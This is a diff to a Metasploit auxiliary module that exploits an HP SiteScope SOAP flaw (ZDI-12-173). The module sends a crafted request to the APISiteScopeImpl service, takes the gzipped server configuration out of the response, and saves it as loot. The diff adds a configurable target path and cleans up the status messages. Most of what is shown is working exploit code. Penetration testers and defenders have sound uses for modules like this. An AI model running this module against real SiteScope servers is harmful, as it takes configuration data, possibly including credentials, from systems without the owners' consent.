@@ -26,7 +26,7 @@ class Metasploit4 < Msf::Auxiliary
 			},
 			'References'   =>
 				[
-					#[ 'OSVDB', '' ],
+					[ 'OSVDB', '85120' ],
 					[ 'BID', '55269' ],
 					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-173/' ]
 				],
@@ -41,7 +41,7 @@ class Metasploit4 < Msf::Auxiliary
 		register_options(
 		[
 			Opt::RPORT(8080),
-
+			OptString.new('TARGETURI', [true, 'Path to SiteScope', '/SiteScope/'])
 		], self.class)
 
 		register_autofilter_ports([ 8080 ])
@@ -53,12 +53,18 @@ class Metasploit4 < Msf::Auxiliary
 	end
 
 	def run_host(ip)
+		@peer = "#{rhost}:#{rport}"
+		@uri = target_uri.path
+		@uri << '/' if @uri[-1,1] != '/'
+
+		print_status("#{@peer} - Connecting to SiteScope SOAP Interface")
+
 		res = send_request_cgi({
-			'uri'     => '/SiteScope/services/APISiteScopeImpl',
+			'uri'     => "#{@uri}services/APISiteScopeImpl",
 			'method'  => 'GET'})
 
 		if not res
-			print_error("#{rhost}:#{rport} - Unable to connect")
+			print_error("#{@peer} - Unable to connect")
 			return
 		end
 
@@ -66,7 +72,6 @@ class Metasploit4 < Msf::Auxiliary
 	end
 
 	def access_configuration
-		print_status("#{rhost}:#{rport} - Connecting to SiteScope SOAP Interface")
 
 		data = "<?xml version='1.0' encoding='UTF-8'?>" + "\r\n"
 		data << "<wsns0:Envelope" + "\r\n"
@@ -83,8 +88,10 @@ class Metasploit4 < Msf::Auxiliary
 		data << "</wsns0:Body>" + "\r\n"
 		data << "</wsns0:Envelope>"
 
+		print_status("#{@peer} - Retrieving the SiteScope Configuration")
+
 		res = send_request_cgi({
-			'uri'      => '/SiteScope/services/APISiteScopeImpl',
+			'uri'      => "#{@uri}services/APISiteScopeImpl",
 			'method'   => 'POST',
 			'ctype'    => 'text/xml; charset=UTF-8',
 			'data'     => data,
@@ -98,7 +105,7 @@ class Metasploit4 < Msf::Auxiliary
 				boundary = $1
 			end
 			if not boundary or boundary.empty?
-				print_error("#{rhost}#{rport} - Failed to retrieve the SiteScope Configuration")
+				print_error("#{@peer} - Failed to retrieve the SiteScope Configuration")
 				return
 			end
 
@@ -106,7 +113,7 @@ class Metasploit4 < Msf::Auxiliary
 				cid = $1
 			end
 			if not cid or cid.empty?
-				print_error("#{rhost}#{rport} - Failed to retrieve the SiteScope Configuration")
+				print_error("#{@peer} - Failed to retrieve the SiteScope Configuration")
 				return
 			end
 
@@ -114,17 +121,17 @@ class Metasploit4 < Msf::Auxiliary
 				loot = Rex::Text.ungzip($1)
 			end
 			if not loot or loot.empty?
-				print_error("#{rhost}#{rport} - Failed to retrieve the SiteScope Configuration")
+				print_error("#{@peer} - Failed to retrieve the SiteScope Configuration")
 				return
 			end
 
 			path = store_loot('hp.sitescope.configuration', 'application/octet-stream', rhost, loot, cid, "#{rhost} HP SiteScope Configuration")
-			print_status("#{rhost}:#{rport} - HP SiteScope Configuration saved in #{path}")
-			print_status("#{rhost}:#{rport} - HP SiteScope Configuration is saved as Java serialization data")
+			print_status("#{@peer} - HP SiteScope Configuration saved in #{path}")
+			print_status("#{@peer} - HP SiteScope Configuration is saved as Java serialization data")
 			return
 		end
 
-		print_error("#{rhost}#{rport} - Failed to retrieve the SiteScope Configuration")
+		print_error("#{@peer} - Failed to retrieve the SiteScope Configuration")
 	end
 
 end
